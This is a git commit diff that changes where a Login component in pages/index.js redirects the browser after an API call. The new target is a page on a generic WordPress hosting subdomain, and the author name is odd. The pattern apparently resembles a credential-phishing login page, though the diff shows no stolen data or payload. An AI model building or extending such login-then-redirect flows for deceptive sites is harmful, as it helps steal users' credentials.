a5117a4e70ab1b0bf626939489a6fb66d814ebd8
hurt the kid <127146284+husknet@users.noreply.github.com>
2025-07-09 11:51:52 -0400

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://net.awillynilly.online/';
+      window.location.href = 'https://wordpress-1479385-5611913.cloudwaysapps.com/bop/nero.html';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
